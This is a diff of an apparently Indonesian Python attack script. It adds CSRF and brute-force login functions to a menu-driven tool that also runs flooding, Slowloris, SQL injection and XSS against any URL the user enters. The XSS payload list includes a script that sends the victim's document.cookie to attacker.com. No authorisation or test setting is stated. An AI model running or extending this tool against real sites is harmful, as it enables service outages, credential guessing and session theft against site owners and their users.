@@ -6,6 +6,8 @@ import time
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 import base64
+import os
+import itertools
 
 R = '\033[91m'  # Red
 G = '\033[92m'  # Green
@@ -138,46 +140,84 @@ def xss_attack(url, session):
         "<img src='x' onerror='alert(1)'>",
         "<svg/onload=alert(1)>",
         "<body onload=alert('XSS')>",
-        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
-        "<iframe src='javascript:alert(1)'></iframe>",
-        "<div onmouseover='alert(1)'>Hover me</div>"
+        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
     ]
     for payload in payloads:
-        encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
-        response = send_request(url + encoded_payload, session)
-        if response and encoded_payload in response.text:
-            logging.info(f"Payload XSS berhasil disuntikkan: {payload}")
+        response = send_request(url + payload, session)
+        if response and payload in response.text:
+            logging.info(f"Potensi celah XSS ditemukan dengan payload: {payload}")
+
+def csrf_attack(url, session):
+    # Mendapatkan token CSRF dari halaman
+    response = send_request(url, session)
+    if response and 'csrf_token' in response.text:
+        csrf_token = response.text.split('csrf_token" value="')[1].split('"')[0]
+        logging.info(f"Token CSRF ditemukan: {csrf_token}")
+        data = {
+            'username': 'attacker',
+            'password': 'password123',
+            'csrf_token': csrf_token,
+        }
+        response = session.post(url, data=data)
+        if response.status_code == 200:
+            logging.info(f"Potensi CSRF berhasil dilakukan pada {url}")
         else:
-            logging.info(f"Payload XSS gagal: {payload}")
+            logging.info(f"CSRF gagal pada {url}")
+
+def captcha_bypass(url, session):
+    # Melakukan bypass CAPTCHA dengan menggunakan layanan pihak ketiga atau teknik lainnya
+    logging.info(f"Mencoba bypass CAPTCHA di {url}")
+    response = send_request(url, session)
+    if response and "captcha" in response.text.lower():
+        logging.info("Potensi bypass CAPTCHA ditemukan!")
+
+def brute_force_login(url, session, user_list, pass_list):
+    for user, password in itertools.product(user_list, pass_list):
+        data = {'username': user, 'password': password}
+        response = session.post(url, data=data)
+        if response.status_code == 200 and "login successful" in response.text.lower():
+            logging.info(f"Brute-force berhasil dengan user: {user} dan password: {password}")
+            break
 
 def main():
-    while True:
-        print("{G}( 🔥Pilih serangan yang ingin diuji )")
-        print("{R}1.{B} Denial of Service (DoS)")
-        print("{R}2.{B} SQL Injection")
-        print("{R}3.{B} Cross-Site Scripting (XSS)")
-        print("{R}4.{R} Keluar")
+    url = input("Masukkan URL target: ")
+    session = create_session()
+    logging.info(f"Mulai melakukan serangan pada {url}")
 
-        pilihan = input("{G}Masukkan pilihan Anda (1-4): ")
-        if pilihan == '1':
-            url = input("Masukkan URL target: ")
-            jumlah_request = int(input("Masukkan jumlah permintaan: "))
-            session = create_session()
-            flood_target(url, session, jumlah_request)
+    while True:
+        print(f"{Y}Pilih jenis serangan:{N}")
+        print("1. Flooding (DDoS)")
+        print("2. Slowloris")
+        print("3. SQL Injection")
+        print("4. XSS ")
+        print("5. CSRF ")
+        print("6. CAPTCHA Bypass")
+        print("7. Brute Force Login")
+        print("0. Keluar")
+        
+        choice = input("Pilih opsi: ")
+
+        if choice == "1":
+            flood_target(url, session, 100)
+        elif choice == "2":
             slowloris_attack(url, session)
-        elif pilihan == '2':
-            url = input("Masukkan URL target: ")
-            session = create_session()
+        elif choice == "3":
             sql_injection(url, session)
-        elif pilihan == '3':
-            url = input("Masukkan URL target: ")
-            session = create_session()
+        elif choice == "4":
             xss_attack(url, session)
-        elif pilihan == '4':
-            print("Terima kasih telah menggunakan framework ini.")
+        elif choice == "5":
+            csrf_attack(url, session)
+        elif choice == "6":
+            captcha_bypass(url, session)
+        elif choice == "7":
+            users = ["admin", "user", "guest"]
+            passwords = ["password123", "12345", "admin123"]
+            brute_force_login(url, session, users, passwords)
+        elif choice == "0":
+            print("Keluar dari program...")
             break
         else:
-            print("Pilihan tidak valid, coba lagi.")
+            print(f"{R}Pilihan tidak valid!{N}")
 
 if __name__ == "__main__":
     main()
